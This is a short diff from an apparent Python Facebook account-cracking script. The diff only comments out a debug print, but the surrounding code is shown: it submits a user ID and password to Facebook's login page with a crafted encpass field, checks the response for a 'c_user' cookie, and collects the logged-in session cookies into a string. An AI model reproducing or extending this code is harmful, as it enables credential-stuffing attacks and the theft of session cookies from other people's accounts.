@@ -110,7 +110,7 @@ def host(uid,pwx,met):
             'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], ps)}
             session.post('https://www.facebook.com/login/',headers=headers,data=data,allow_redirects=False)
             heron_brand=session.cookies.get_dict().keys()
-            print(heron_brand)
+            #print(heron_brand)
             if "c_user" in heron_brand:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 xd=coki.split("c_user=")[1].split(";")[0]
